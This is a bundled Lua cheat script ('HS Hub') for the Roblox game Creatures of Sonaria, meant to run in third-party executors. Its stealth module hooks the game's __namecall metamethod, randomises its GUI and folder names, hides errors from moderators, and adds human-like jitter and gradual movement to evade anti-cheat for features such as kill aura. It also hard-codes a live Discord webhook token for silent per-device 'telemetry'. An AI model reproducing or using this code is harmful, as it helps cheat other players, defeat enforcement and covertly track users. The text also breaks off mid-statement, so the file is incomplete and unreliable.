--[[
═══════════════════════════════════════════════════════════════════════
                           HS HUB
                       Hydra Solvation
                         by isentp
                  discord.gg/5rpP6faZSJ

    Game     : Creatures of Sonaria  (Roblox creature survival)
    Build    : HS-COS-V4
    Bundled  : 2026-05-29
    Library  : HSHub_UI v1.0.0

    This is a BUNDLED file. Do not edit directly — instead edit
    games/<game>/module.lua and re-run tools/bundle.py.
═══════════════════════════════════════════════════════════════════════
]]

if shared.__HSHUB_BUNDLE_LOADED then return end
shared.__HSHUB_BUNDLE_LOADED = true

-- ─── telemetry config (silent, anti-spam per HWID) ──────
_G.HSHUB_TELEMETRY_WEBHOOK = "https://discordapp.com/api/webhooks/1489488895547539636/FvDWepbQa6kH3_Eysioy5vGTdI4lfV4k3LHyPVs8W9-ZzuLiIXXiLk8KneX5hdT4zCnc"
_G.HSHUB_TELEMETRY_INTERVAL = 100

-- ─── inlined: HSHub_Stealth ───────────────────────────────────
_G.HSHub_Stealth = (function()
local Stealth = {}

-- ═════════════════════════════════════════════════════════════════════
--                     EXECUTOR DETECTION
-- ═════════════════════════════════════════════════════════════════════
local function _identify()
    local ok, name, ver = pcall(function()
        if identifyexecutor then return identifyexecutor() end
        return "Unknown", "0"
    end)
    if ok then return name or "Unknown", ver or "0" end
    return "Unknown", "0"
end

local execName, execVer = _identify()
Stealth.Executor       = execName
Stealth.ExecutorVer    = execVer

-- normalize executor family
local _low = execName:lower()
Stealth.IsDelta     = _low:find("delta") ~= nil
Stealth.IsSynapse   = _low:find("synapse") ~= nil
Stealth.IsKrampus   = _low:find("krampus") ~= nil
Stealth.IsFluxus    = _low:find("fluxus") ~= nil
Stealth.IsCodex     = _low:find("codex") ~= nil
Stealth.IsHydrogen  = _low:find("hydrogen") ~= nil
Stealth.IsKrnl      = _low:find("krnl") ~= nil
Stealth.IsPotassium = _low:find("potassium") ~= nil
Stealth.IsWave      = _low:find("wave") ~= nil

-- mobile vs PC heuristic
local UIS = game:GetService("UserInputService")
Stealth.IsMobile = UIS.TouchEnabled and not UIS.MouseEnabled
Stealth.IsPC     = not Stealth.IsMobile

-- ═════════════════════════════════════════════════════════════════════
--                  CAPABILITY DETECTION
-- ═════════════════════════════════════════════════════════════════════
Stealth.Cap = {
    hookfunction    = type(hookfunction) == "function"
                       or (syn and type(syn.hook) == "function")
                       or (Krampus and type(Krampus.hook) == "function"),
    hookmetamethod  = type(hookmetamethod) == "function",
    getnamecallmethod = type(getnamecallmethod) == "function",
    newcclosure     = type(newcclosure) == "function",
    cloneref        = type(cloneref) == "function",
    setclipboard    = type(setclipboard) == "function" or type(toclipboard) == "function",
    gethui          = type(gethui) == "function",
    drawing         = type(Drawing) == "table",
    writefile       = type(writefile) == "function",
    readfile        = type(readfile) == "function",
    isfile          = type(isfile) == "function",
    delfile         = type(delfile) == "function",
    isfolder        = type(isfolder) == "function",
    makefolder      = type(makefolder) == "function",
    listfiles       = type(listfiles) == "function",
    queue_on_teleport = type(queue_on_teleport) == "function"
                         or (syn and type(syn.queue_on_teleport) == "function"),
    checkcaller     = type(checkcaller) == "function",
    getrawmetatable = type(getrawmetatable) == "function",
    setreadonly     = type(setreadonly) == "function" or type(make_writeable) == "function",
    request         = type(request) == "function"
                       or (syn and type(syn.request) == "function")
                       or (http and type(http.request) == "function"),
    mousemoverel    = type(mousemoverel) == "function",
    virtualuser     = pcall(function() return game:FindService("VirtualUser") end)
                       and game:FindService("VirtualUser") ~= nil,
}

-- ═════════════════════════════════════════════════════════════════════
--                    SAFE WRAPPERS
-- ═════════════════════════════════════════════════════════════════════
Stealth.cloneref = cloneref or function(o) return o end
Stealth.gethui   = gethui or function() return game:GetService("CoreGui") end
Stealth.checkcaller = checkcaller or function() return false end
Stealth.newcclosure = newcclosure or function(f) return f end

Stealth.hookfunction = hookfunction or (syn and syn.hook) or (Krampus and Krampus.hook)
Stealth.hookmetamethod = hookmetamethod
Stealth.getnamecallmethod = getnamecallmethod

Stealth.setclipboard = setclipboard or toclipboard or function() end

Stealth.writefile  = writefile  or function() end
Stealth.readfile   = readfile   or function() return nil end
Stealth.isfile     = isfile     or function() return false end
Stealth.delfile    = delfile    or function() end
Stealth.isfolder   = isfolder   or function() return false end
Stealth.makefolder = makefolder or function() end
Stealth.listfiles  = listfiles  or function() return {} end

Stealth.protect_gui = (syn and syn.protect_gui) or protect_gui or function() end

-- ═════════════════════════════════════════════════════════════════════
--                   SILENT ERROR SINK
-- ═════════════════════════════════════════════════════════════════════
-- All HSHub modules should use these instead of warn/print so nothing
-- leaks to the console (moderators / anti-cheat can watch console).
local _errLog = {}
function Stealth.silentError(err, context)
    table.insert(_errLog, {
        t = tick(),
        context = tostring(context or "?"),
        err = tostring(err):sub(1, 200),
    })
    if #_errLog > 50 then table.remove(_errLog, 1) end
end
function Stealth.silentTry(fn, context, ...)
    local ok, err = pcall(fn, ...)
    if not ok then Stealth.silentError(err, context) end
    return ok, err
end
function Stealth.getErrorLog() return _errLog end
function Stealth.clearErrorLog() _errLog = {} end

-- ═════════════════════════════════════════════════════════════════════
--               RANDOMIZED IDENTIFIERS (per-session)
-- ═════════════════════════════════════════════════════════════════════
math.randomseed(tick() % 1 * 1e9)

local function _randStr(n)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local t = {}
    for i = 1, (n or 10) do
        t[i] = chars:sub(math.random(1, #chars), math.random(1, #chars))
    end
    return table.concat(t)
end
Stealth.rs = _randStr

-- Cached identity for this session — same names reused if same script
-- re-executes mid-session (e.g. respawn). Different session = different.
local _sessionIdents = nil
function Stealth.GetSessionIdents()
    if _sessionIdents then return _sessionIdents end
    _sessionIdents = {
        GuiName      = "_" .. _randStr(10),
        ChamsName    = "_" .. _randStr(8),
        FolderName   = "_hsd_" .. _randStr(6),
        ConfigFile   = _randStr(12) .. ".dat",
        BodyVelName  = "_" .. _randStr(6),
        BodyGyroName = "_" .. _randStr(6),
        SelectionName = "_" .. _randStr(7),
    }
    return _sessionIdents
end

-- ═════════════════════════════════════════════════════════════════════
--                ANTI-AFK (prefer VirtualUser)
-- ═════════════════════════════════════════════════════════════════════
function Stealth.AttachAntiAFK(getEnabledFn)
    -- getEnabledFn: function() -> bool — return true if anti-AFK active
    local LP = game:GetService("Players").LocalPlayer
    if not LP or not LP.Idled then return end
    local VU = game:FindService("VirtualUser")
    LP.Idled:Connect(function()
        if getEnabledFn and not getEnabledFn() then return end
        Stealth.silentTry(function()
            if VU then
                VU:CaptureController()
                VU:ClickButton2(Vector2.new())
            else
                local VIM = game:GetService("VirtualInputManager")
                VIM:SendKeyEvent(true,  Enum.KeyCode.Space, false, game)
                task.wait(0.05)
                VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
            end
        end, "anti-afk")
    end)
end

-- ═════════════════════════════════════════════════════════════════════
--                HUMAN-LIKE TIMING HELPERS
-- ═════════════════════════════════════════════════════════════════════
-- For features that fire repeatedly (kill aura, parry, etc), add jitter
-- so timing isn't perfectly periodic.

-- jittered cooldown — returns a function that gates calls with random
-- delay between minMs and maxMs (defaults to plausible human range).
function Stealth.MakeRateLimiter(minMs, maxMs)
    minMs = minMs or 180   -- ~5.5 actions/sec max baseline
    maxMs = maxMs or 280
    local last = 0
    local cur = 0
    return function()
        local now = tick() * 1000
        if (now - last) < cur then return false end
        last = now
        cur = math.random(minMs, maxMs)
        return true
    end
end

-- ═════════════════════════════════════════════════════════════════════
--                CFRAME MOVEMENT (gradual, not instant)
-- ═════════════════════════════════════════════════════════════════════
-- Anti-cheat-friendly position change — never teleport instantly.
-- Returns true if movement completed, false if interrupted.
function Stealth.GradualMove(hrp, targetCFrame, durationSec)
    if not hrp or not hrp.Parent then return false end
    local startCF = hrp.CFrame
    local startTime = tick()
    local duration = durationSec or 0.3
    while tick() - startTime < duration do
        if not hrp.Parent then return false end
        local alpha = math.clamp((tick() - startTime) / duration, 0, 1)
        -- ease out cubic
        alpha = 1 - (1 - alpha) ^ 3
        hrp.CFrame = startCF:Lerp(targetCFrame, alpha)
        task.wait()
    end
    hrp.CFrame = targetCFrame
    return true
end

-- ═════════════════════════════════════════════════════════════════════
--                NAMECALL HOOK INSTALLER (one-shot)
-- ═════════════════════════════════════════════════════════════════════
-- Installs a single __namecall hook shared by all HSHub modules.
-- Handlers register themselves and get called in order.
local _nchandlers = {}
local _nchooked = false
local _origNamecall = nil

function Stealth.RegisterNamecall(name, handler)
    -- handler: function(self, methodName, args) -> nil | new_return_value
    _nchandlers[name] = handler
end
function Stealth.UnregisterNamecall(name)
    _nchandlers[name] = nil
end

function Stealth.InstallNamecallHook()
    if _nchooked or not Stealth.Cap.hookmetamethod then return false end
    local ok, err = pcall(function()
        _origNamecall = hookmetamethod(game, "__namecall", Stealth.newcclosure(function(self, ...)
            local method = Stealth.getnamecallmethod and Stealth.getnamecallmethod() or ""
            local args = {...}
            if not Stealth.checkcaller() then
                for _, h in pairs(_nchandlers) do
                    local result = h(self, method, args)
                    if result ~= nil then return result end
                end
            end
            return _origNamecall(self, ...)
        end))
    end)
    if ok then _nchooked = true; return true end
    Stealth.silentError(err, "InstallNamecallHook")
    return false
end

-- ═════════════════════════════════════════════════════════════════════
--                  PLATFORM SUMMARY
-- ═════════════════════════════════════════════════════════════════════
function Stealth.GetPlatformSummary()
    return {
        Executor   = Stealth.Executor,
        Version    = Stealth.ExecutorVer,
        IsMobile   = Stealth.IsMobile,
        IsPC       = Stealth.IsPC,
        Caps       = Stealth.Cap,
        HookOK     = _nchooked,
    }
end

return Stealth
end)()

-- ─── inlined: HSHub ───────────────────────────────────────────
_G.HSHub = (function()
if shared.__HSHub_UI then return shared.__HSHub_UI end

-- ═════════════════════════════════════════════════════════════════════
--                          SERVICES
-- ═════════════════════════════════════════════════════════════════════
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local CoreGui          = game:GetService("CoreGui")
local HttpService      = game:GetService("HttpService")

local LP = Players.LocalPlayer

-- ═════════════════════════════════════════════════════════════════════
--                       PLATFORM DETECTION
-- ═════════════════════════════════════════════════════════════════════
local _platform = "PC"
do
    local ok, ident = pcall(function() return identifyexecutor() end)
    if ok and type(ident) == "string" then
        local low = ident:lower()
        if low:find("delta") or low:find("codex") or low:find("hydrogen")
        or low:find("krnl") or low:find("arceus") then
            _platform = "Mobile"
        end
    end
    -- secondary: check touch support
    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
        _platform = "Mobile"
    end
end
local IS_PC = _platform == "PC"

-- ═════════════════════════════════════════════════════════════════════
--                       STEALTH HELPERS
-- ═════════════════════════════════════════════════════════════════════
local _gethui      = gethui or function() return CoreGui end
local _protect_gui = (syn and syn.protect_gui) or protect_gui or function() end
local _setclipboard = setclipboard or (toclipboard) or function() end

local function _rs(n)
    n = n or 8
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local t = {}
    for i = 1, n do t[i] = chars:sub(math.random(1, #chars), math.random(1, #chars)) end
    return table.concat(t)
end
math.randomseed(tick() % 1 * 1e9)

-- ═════════════════════════════════════════════════════════════════════
--                            THEME
-- ═════════════════════════════════════════════════════════════════════
local Theme = {
    -- backgrounds (very dark navy with hint of purple)
    Bg          = Color3.fromRGB( 8,  8, 18),
    BgPanel     = Color3.fromRGB(12, 12, 24),
    BgCard      = Color3.fromRGB(18, 18, 35),
    BgCardHover = Color3.fromRGB(24, 24, 48),
    BgSidebar   = Color3.fromRGB(10, 10, 20),
    BgInput     = Color3.fromRGB(14, 14, 28),
    TitleBar    = Color3.fromRGB(14, 12, 28),

    -- accents (purple→cyan gradient — match HS logo)
    AccentA     = Color3.fromRGB(140,  90, 245),  -- purple primary
    AccentB     = Color3.fromRGB( 60, 200, 230),  -- cyan secondary
    AccentDim   = Color3.fromRGB(100,  60, 190),
    AccentGlow  = Color3.fromRGB(170, 120, 255),
    Hydra       = Color3.fromRGB(190,  90, 255),  -- magenta-purple

    -- semantic
    Green       = Color3.fromRGB( 40, 200, 120),
    GreenDim    = Color3.fromRGB( 30, 160,  90),
    Red         = Color3.fromRGB(220,  50,  60),
    RedDim      = Color3.fromRGB(160,  35,  45),
    Orange      = Color3.fromRGB(255, 170,  50),
    Gold        = Color3.fromRGB(255, 200,  60),

    -- text
    Text        = Color3.fromRGB(220, 220, 235),
    TextSub     = Color3.fromRGB(100, 100, 140),
    TextDim     = Color3.fromRGB( 65,  65,  90),
    White       = Color3.fromRGB(255, 255, 255),

    -- structural
    Border      = Color3.fromRGB( 45,  35,  80),
    BorderGlow  = Color3.fromRGB(100,  70, 180),
    Divider     = Color3.fromRGB( 28,  28,  46),
    TabActive   = Color3.fromRGB( 25,  20,  50),
    TabHover    = Color3.fromRGB( 20,  18,  40),

    -- toggle pill
    ToggleOn    = Color3.fromRGB(140,  90, 245),
    ToggleOff   = Color3.fromRGB( 40,  40,  60),
    Knob        = Color3.fromRGB(235, 235, 245),

    -- button variants
    BtnBase     = Color3.fromRGB( 35,  25,  70),
    BtnBaseH    = Color3.fromRGB( 50,  35,  95),
    BtnDanger   = Color3.fromRGB( 50,  20,  25),
    BtnDangerH  = Color3.fromRGB( 70,  28,  35),
    BtnSafe     = Color3.fromRGB( 25,  60,  35),
    BtnSafeH    = Color3.fromRGB( 35,  85,  50),
    BtnAction   = Color3.fromRGB( 25,  35,  75),
    BtnActionH  = Color3.fromRGB( 35,  50, 105),
}

-- ═════════════════════════════════════════════════════════════════════
--                       SIZING (adaptive)
-- ═════════════════════════════════════════════════════════════════════
local Sz = {
    WinW       = IS_PC and 480 or 410,
    WinH       = IS_PC and 410 or 360,
    SideW      = IS_PC and 110 or 90,
    TitleBarH  = IS_PC and  36 or  30,
    TabH       = IS_PC and  32 or  28,
    FloatW     = IS_PC and  50 or  46,
    FloatH     = IS_PC and  38 or  36,

    -- text sizes
    TitleText  = IS_PC and 13 or 12,
    SubText    = IS_PC and  9 or  8,
    TagText    = IS_PC and  9 or  8,
    TabText    = IS_PC and 10 or  9,
    HdrText    = IS_PC and 10 or  9,
    ElemText   = IS_PC and 11 or 10,
    BtnText    = IS_PC and 10 or  9,

    -- toggle / slider
    PillW      = IS_PC and 38 or 34,
    PillH      = IS_PC and 20 or 18,
    KnobSz     = IS_PC and 14 or 12,
    SliderH    = IS_PC and  5 or  4,

    -- spacing
    CardRad    = UDim.new(0, 8),
    BtnRad     = UDim.new(0, 6),
    SectionPad = IS_PC and 8 or 6,
}

-- ═════════════════════════════════════════════════════════════════════
--                        UTIL HELPERS
-- ═════════════════════════════════════════════════════════════════════
local function _new(class, props, children)
    local o = Instance.new(class)
    if props then
        for k, v in pairs(props) do
            if k ~= "Parent" then o[k] = v end
        end
        if props.Parent then o.Parent = props.Parent end
    end
    if children then
        for _, c in ipairs(children) do c.Parent = o end
    end
    return o
end
local function _corner(r, p) Instance.new("UICorner", p).CornerRadius = UDim.new(0, r) end
local function _stroke(parent, color, thick, trans)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Border
    s.Thickness = thick or 1
    s.Transparency = trans or 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end
local function _pad(parent, l, r, t, b)
    local p = Instance.new("UIPadding")
    p.PaddingLeft   = UDim.new(0, l or 0)
    p.PaddingRight  = UDim.new(0, r or 0)
    p.PaddingTop    = UDim.new(0, t or 0)
    p.PaddingBottom = UDim.new(0, b or 0)
    p.Parent = parent
    return p
end
local function _list(parent, dir, spacing, sort)
    local l = Instance.new("UIListLayout")
    l.FillDirection = dir or Enum.FillDirection.Vertical
    l.SortOrder = sort or Enum.SortOrder.LayoutOrder
    l.Padding = UDim.new(0, spacing or 0)
    l.Parent = parent
    return l
end
local function _gradient(parent, colors, rotation, trans)
    local g = Instance.new("UIGradient")
    if type(colors) == "table" then
        local kps = {}
        for i, c in ipairs(colors) do
            kps[i] = ColorSequenceKeypoint.new((i-1)/(#colors-1), c)
        end
        g.Color = ColorSequence.new(kps)
    end
    g.Rotation = rotation or 0
    if trans then g.Transparency = trans end
    g.Parent = parent
    return g
end

local TI_FAST  = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local TI_MED   = TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local TI_SLOW  = TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
local TI_PULSE = TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)

local function _tween(obj, info, props)
    local t = TweenService:Create(obj, info or TI_MED, props)
    t:Play()
    return t
end

-- ═════════════════════════════════════════════════════════════════════
--                       SCREENGUI ROOT
-- ═════════════════════════════════════════════════════════════════════
-- Remove any prior HSHub instances (re-exec safety)
local _GUI_MARKER = "HSHub_GUI_v1"
pcall(function()
    for _, par in ipairs({_gethui(), CoreGui, LP:FindFirstChild("PlayerGui")}) do
        if par then
            for _, c in ipairs(par:GetChildren()) do
                if c:IsA("ScreenGui") and c:GetAttribute("HSHubMarker") then
                    c:Destroy()
                end
            end
        end
    end
end)

local ScreenGui = _new("ScreenGui", {
    Name = "_" .. _rs(10),
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true,
    DisplayOrder = 9999,
})
ScreenGui:SetAttribute("HSHubMarker", true)

pcall(_protect_gui, ScreenGui)
local _ok = pcall(function() ScreenGui.Parent = _gethui() end)
if not _ok or not ScreenGui.Parent then
    pcall(function() ScreenGui.Parent = LP:WaitForChild("PlayerGui") end)
end
if not ScreenGui.Parent then pcall(function() ScreenGui.Parent = CoreGui end) end

-- ═════════════════════════════════════════════════════════════════════
--                       NOTIFICATION SYSTEM
-- ═════════════════════════════════════════════════════════════════════
local NotifyContainer = _new("Frame", {
    Parent = ScreenGui,
    Size = UDim2.new(0, 260, 1, -100),
    Position = UDim2.new(1, -270, 0, 50),
    BackgroundTransparency = 1,
    ZIndex = 50,
})
_list(NotifyContainer, Enum.FillDirection.Vertical, 6)

local function Notify(text, kind, dur)
    kind = kind or "info"
    dur = dur or 2.5
    local col = ({
        ok    = Theme.Green,
        err   = Theme.Red,
        warn  = Theme.Orange,
        info  = Theme.AccentB,
    })[kind] or Theme.AccentB

    local n = _new("Frame", {
        Parent = NotifyContainer,
        Size = UDim2.new(1, 0, 0, 42),
        BackgroundColor3 = Theme.BgPanel,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
    })
    _corner(8, n)
    _stroke(n, Theme.Border, 1, 0.3)

    -- accent bar
    local bar = _new("Frame", {
        Parent = n,
        Size = UDim2.new(0, 3, 1, -8),
        Position = UDim2.new(0, 5, 0, 4),
        BackgroundColor3 = col,
        BorderSizePixel = 0,
    })
    _corner(2, bar)
    _new("TextLabel", {
        Parent = n,
        Size = UDim2.new(1, -22, 1, 0),
        Position = UDim2.new(0, 14, 0, 0),
        BackgroundTransparency = 1,
        Text = text,
        TextColor3 = Theme.Text,
        TextSize = 11,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextWrapped = true,
        TextYAlignment = Enum.TextYAlignment.Center,
    })

    -- entry animation
    n.Position = UDim2.new(1, 30, 0, 0)
    n.BackgroundTransparency = 1
    _tween(n, TI_FAST, {Position = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 0.05})

    task.delay(dur, function()
        if n.Parent then
            _tween(n, TI_FAST, {BackgroundTransparency = 1, Position = UDim2.new(1, 30, 0, 0)})
            task.delay(0.2, function() if n.Parent then n:Destroy() end end)
        end
    end)
end

-- ═════════════════════════════════════════════════════════════════════
--                        DRAG HELPER
-- ═════════════════════════════════════════════════════════════════════
local function _makeDraggable(handle, target)
    target = target or handle
    local dragging, dragStart, startPos
    handle.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1
        or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = inp.Position
            startPos = target.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(inp)
        if not dragging then return end
        if inp.UserInputType == Enum.UserInputType.MouseMovement
        or inp.UserInputType == Enum.UserInputType.Touch then
            local d = inp.Position - dragStart
            target.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end

-- ═════════════════════════════════════════════════════════════════════
--                  FLOATING HS LOGO BUTTON (vector replica)
-- ═════════════════════════════════════════════════════════════════════
local function _makeFloatButton()
    local floatBtn = _new("TextButton", {
        Parent = ScreenGui,
        Size = UDim2.new(0, Sz.FloatW, 0, Sz.FloatH),
        Position = UDim2.new(0, 8, 0, IS_PC and 50 or 80),
        BackgroundColor3 = Theme.BgPanel,
        AutoButtonColor = false,
        Text = "",
        BorderSizePixel = 0,
        ZIndex = 200,
        Active = true,
    })
    _corner(10, floatBtn)
    _stroke(floatBtn, Theme.AccentGlow, 1.5, 0.4)

    -- gradient background (purple→cyan)
    _gradient(floatBtn, {Theme.AccentA, Theme.AccentB}, 30)

    -- "HS" letters (mimicking logo)
    local label = _new("TextLabel", {
        Parent = floatBtn,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "HS",
        TextColor3 = Theme.White,
        TextSize = IS_PC and 18 or 16,
        Font = Enum.Font.GothamBlack,
        ZIndex = 201,
    })

    -- glow halo
    local glow = _new("Frame", {
        Parent = floatBtn,
        Size = UDim2.new(1, 10, 1, 10),
        Position = UDim2.new(0, -5, 0, -5),
        BackgroundColor3 = Theme.AccentGlow,
        BackgroundTransparency = 0.85,
        BorderSizePixel = 0,
        ZIndex = 199,
    })
    _corner(13, glow)
    _tween(glow, TI_PULSE, {BackgroundTransparency = 0.95})

    floatBtn.MouseEnter:Connect(function()
        _tween(floatBtn, TI_FAST, {Size = UDim2.new(0, Sz.FloatW + 4, 0, Sz.FloatH + 4)})
    end)
    floatBtn.MouseLeave:Connect(function()
        _tween(floatBtn, TI_FAST, {Size = UDim2.new(0, Sz.FloatW, 0, Sz.FloatH)})
    end)

    _makeDraggable(floatBtn)
    return floatBtn
end

-- ═════════════════════════════════════════════════════════════════════
--                  GLOBAL LIBRARY INSTANCE
-- ═════════════════════════════════════════════════════════════════════
local HSHub = {}
HSHub.__index = HSHub
HSHub.Theme = Theme
HSHub.Sz = Sz
HSHub.Notify = Notify
HSHub.ScreenGui = ScreenGui
HSHub.Windows = {}
HSHub.Version = "1.0.0"

shared.__HSHub_UI = HSHub

-- ═════════════════════════════════════════════════════════════════════
--                       WINDOW BUILDER
-- ═════════════════════════════════════════════════════════════════════
function HSHub:CreateWindow(opts)
    opts = opts or {}
    local Window = {}
    Window.Title    = opts.Title    or "HS HUB"
    Window.Subtitle = opts.Subtitle or "Hydra Solvation"
    Window.Tag      = opts.Tag      or "HS-V1"
    Window.Tabs     = {}
    Window.ActiveTab = nil
    Window.IsVisible = false

    -- Main frame
    local Frame = _new("Frame", {
        Parent = ScreenGui,
        Size = UDim2.new(0, Sz.WinW, 0, Sz.WinH),
        Position = UDim2.new(0, 8, 0, IS_PC and 100 or 130),
        BackgroundColor3 = Theme.BgPanel,
        BackgroundTransparency = 0.02,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 100,
        ClipsDescendants = true,
    })
    _corner(12, Frame)
    _stroke(Frame, Theme.Border, 1, 0.3)

    -- ── Title bar ─────────────────────────────────────
    local TitleBar = _new("Frame", {
        Parent = Frame,
        Size = UDim2.new(1, 0, 0, Sz.TitleBarH),
        BackgroundColor3 = Theme.TitleBar,
        BorderSizePixel = 0,
        ZIndex = 101,
    })
    _gradient(TitleBar, {
        Color3.fromRGB(20, 14, 40),
        Color3.fromRGB(14, 12, 28),
        Color3.fromRGB(10, 10, 22),
    }, 90)

    -- accent line under title
    local accentLine = _new("Frame", {
        Parent = TitleBar,
        Size = UDim2.new(1, 0, 0, 1),
        Position = UDim2.new(0, 0, 1, -1),
        BackgroundColor3 = Theme.AccentA,
        BackgroundTransparency = 0.5,
        BorderSizePixel = 0,
        ZIndex = 102,
    })
    local lineGrad = _gradient(accentLine, {Theme.AccentA, Theme.Hydra, Theme.AccentB}, 0)
    lineGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0,   0.8),
        NumberSequenceKeypoint.new(0.5, 0.2),
        NumberSequenceKeypoint.new(1,   0.8),
    })

    -- Title text
    local titleLbl = _new("TextLabel", {
        Parent = TitleBar,
        Size = UDim2.new(1, -90, 1, 0),
        Position = UDim2.new(0, 12, 0, 0),
        BackgroundTransparency = 1,
        Text = Window.Title,
        TextColor3 = Theme.Text,
        TextSize = Sz.TitleText,
        Font = Enum.Font.GothamBlack,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 102,
    })

    -- Subtitle (smaller, beside title)
    local subLbl = _new("TextLabel", {
        Parent = TitleBar,
        Size = UDim2.new(0, 120, 0, 12),
        Position = UDim2.new(0, 12 + (Window.Title:len() * (Sz.TitleText - 4)) + 6, 1, -14),
        BackgroundTransparency = 1,
        Text = Window.Subtitle,
        TextColor3 = Theme.AccentB,
        TextSize = Sz.SubText,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 102,
    })

    -- Tag (top-right corner)
    local tagLbl = _new("TextLabel", {
        Parent = TitleBar,
        Size = UDim2.new(0, 60, 0, 14),
        Position = UDim2.new(1, -85, 0, 6),
        BackgroundTransparency = 1,
        Text = Window.Tag,
        TextColor3 = Theme.AccentA,
        TextSize = Sz.TagText,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Right,
        ZIndex = 102,
    })

    -- Close button (top-right)
    local closeBtn = _new("TextButton", {
        Parent = TitleBar,
        Size = UDim2.new(0, Sz.TitleBarH - 10, 0, Sz.TitleBarH - 10),
        Position = UDim2.new(1, -(Sz.TitleBarH - 4), 0, 5),
        BackgroundColor3 = Theme.Red,
        BackgroundTransparency = 0.85,
        Text = "✕",
        TextColor3 = Theme.Red,
        TextSize = 12,
        Font = Enum.Font.GothamBold,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        ZIndex = 103,
    })
    _corner(5, closeBtn)
    closeBtn.MouseEnter:Connect(function()
        _tween(closeBtn, TI_FAST, {BackgroundTransparency = 0.3, TextColor3 = Theme.White})
    end)
    closeBtn.MouseLeave:Connect(function()
        _tween(closeBtn, TI_FAST, {BackgroundTransparency = 0.85, TextColor3 = Theme.Red})
    end)

    -- ── Body (sidebar + content) ──────────────────────
    local Body = _new("Frame", {
        Parent = Frame,
        Size = UDim2.new(1, 0, 1, -Sz.TitleBarH),
        Position = UDim2.new(0, 0, 0, Sz.TitleBarH),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
    })

    -- Sidebar
    local Sidebar = _new("Frame", {
        Parent = Body,
        Size = UDim2.new(0, Sz.SideW, 1, 0),
        BackgroundColor3 = Theme.BgSidebar,
        BorderSizePixel = 0,
    })
    _gradient(Sidebar, {
        Color3.fromRGB(12, 12, 24),
        Color3.fromRGB( 8,  8, 18),
    }, 90)
    -- right divider
    _new("Frame", {
        Parent = Sidebar,
        Size = UDim2.new(0, 1, 1, 0),
        Position = UDim2.new(1, -1, 0, 0),
        BackgroundColor3 = Theme.Border,
        BorderSizePixel = 0,
    })

    -- Sidebar tab scroll
    local SideScroll = _new("ScrollingFrame", {
        Parent = Sidebar,
        Size = UDim2.new(1, 0, 1, -42),
        Position = UDim2.new(0, 0, 0, 6),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 0,
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        CanvasSize = UDim2.new(0, 0, 0, 0),
    })
    _list(SideScroll, Enum.FillDirection.Vertical, 2)
    _pad(SideScroll, 6, 6, 4, 8)

    -- Sidebar footer with HS signature (always visible)
    local SideFooter = _new("Frame", {
        Parent = Sidebar,
        Size = UDim2.new(1, 0, 0, 36),
        Position = UDim2.new(0, 0, 1, -36),
        BackgroundColor3 = Theme.BgSidebar,
        BorderSizePixel = 0,
    })
    _new("Frame", {  -- divider above footer
        Parent = SideFooter,
        Size = UDim2.new(1, -12, 0, 1),
        Position = UDim2.new(0, 6, 0, 0),
        BackgroundColor3 = Theme.Border,
        BackgroundTransparency = 0.4,
        BorderSizePixel = 0,
    })
    local sigBrand = _new("TextLabel", {
        Parent = SideFooter,
        Size = UDim2.new(1, -8, 0, 16),
        Position = UDim2.new(0, 6, 0.5, -8),
        BackgroundTransparency = 1,
        Text = "HS HUB",
        TextColor3 = Theme.AccentA,
        TextSize = 11,
        Font = Enum.Font.GothamBlack,
        TextXAlignment = Enum.TextXAlignment.Left,
    })
    -- pulse the brand letter
    _tween(sigBrand, TI_PULSE, {TextColor3 = Theme.AccentB})

    -- Content area
    local Content = _new("Frame", {
        Parent = Body,
        Size = UDim2.new(1, -Sz.SideW, 1, 0),
        Position = UDim2.new(0, Sz.SideW, 0, 0),
        BackgroundColor3 = Theme.Bg,
        BorderSizePixel = 0,
    })

    -- Content title (current tab name)
    local contentTitle = _new("TextLabel", {
        Parent = Content,
        Size = UDim2.new(1, -20, 0, 24),
        Position = UDim2.new(0, 14, 0, 10),
        BackgroundTransparency = 1,
        Text = "",
        TextColor3 = Theme.Text,
        TextSize = 14,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
    })

    -- Divider under tab title
    _new("Frame", {
        Parent = Content,
        Size = UDim2.new(1, -24, 0, 1),
